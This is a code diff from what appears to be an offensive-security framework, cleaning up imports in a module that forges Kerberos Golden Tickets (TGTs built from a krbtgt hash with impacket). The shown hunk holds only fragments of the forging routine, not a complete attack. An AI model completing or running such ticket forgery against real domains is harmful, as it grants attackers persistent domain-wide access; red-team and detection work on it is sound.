@@ -339,37 +339,9 @@ class GoldenTicketModule(BaseModule[GoldenTicketParams, ModuleResult]):
             Uses impacket.krb5.ticket + CCache to build a valid TGT from the krbtgt hash.
             """
             try:
-                from impacket.krb5.asn1 import AS_REP, EncTicketPart, TGS_REP
-                from impacket.krb5.ccache import CCache
-                from impacket.krb5.crypto import Key, _enctype_table
-                from impacket.krb5.constants import (
-                    EncryptionTypes, PrincipalNameType, ApplicationTagNumbers
-                )
-                from impacket.krb5.types import Principal, KerberosTime
-                from impacket.krb5 import constants
-                from pyasn1.codec.ber import decoder, encoder
-                from pyasn1.type.univ import noValue
-                import datetime, struct, os as _os
+                import os as _os
 
                 domain_upper = domain.upper()
-                nt_hash      = bytes.fromhex(nt_part)
-
-                # Use impacket.krb5.kerberosv5 ticketer equivalent
-                # Build ticket using impacket's built-in ticketer module
-                # This is the stable library approach used in modern impacket
-                from impacket.krb5.kerberosv5 import getKerberosTGT
-                from impacket.krb5.types import Principal
-
-                user_principal = Principal(
-                    username,
-                    type=constants.PrincipalNameType.NT_PRINCIPAL.value,
-                )
-
-                # Build a valid Golden Ticket via impacket's Ticketer class
-                # which is the internal library used by ticketer.py
-                from impacket.krb5.pac import PACTYPE, PAC_INFO_BUFFER, PAC_CREDENTIAL_DATA
-                from impacket.krb5 import crypto as krb5crypto
-                import tempfile
 
                 # Use the TICKETER approach from impacket.examples.ticketer
                 # but call the internal class directly (not via subprocess)
